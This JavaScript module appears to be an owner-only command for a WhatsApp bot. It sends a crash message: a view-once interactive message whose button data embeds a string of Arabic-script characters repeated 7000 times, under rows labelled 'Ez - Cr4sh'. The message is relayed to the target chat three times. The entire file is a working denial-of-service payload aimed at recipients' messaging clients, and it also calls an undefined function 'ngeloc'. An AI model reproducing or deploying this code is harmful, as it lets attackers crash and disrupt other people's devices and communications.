module.exports = {
    type: 'owner',
    command: 'ryocakep',
    operate: async (context) => {
        const { ryozingod, m, sleep, buglive } = context;
        let penis = '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(7000)
        let msg = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "",
                        },
                        body: {
                            text: "🔥⃟༑𝐂𝐎𝐒𝐓𝐒༑⃟🧐⃟ ⟩ 𝐛𝐲 DEMON KILLER☆ >"
                        },
                        footer: {
                            text: "https://lol.zetsuboxygen.ml/costs"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: `{"title":"▾ 😈DEMON KILLER�😈 ▾","sections":[{"title":"🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑ #${penis}","rows":[{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"}]}]}`
                                }
                            ],
                            messageParamsJson: ""
                        }
                    }
                }
            }
        };

        for (let j = 0; j < 3; j++) {
            await ryozingod.relayMessage(m.chat, msg, {})
            await ngeloc(m.chat, m)
            await sleep(1000)
        }
    }
}
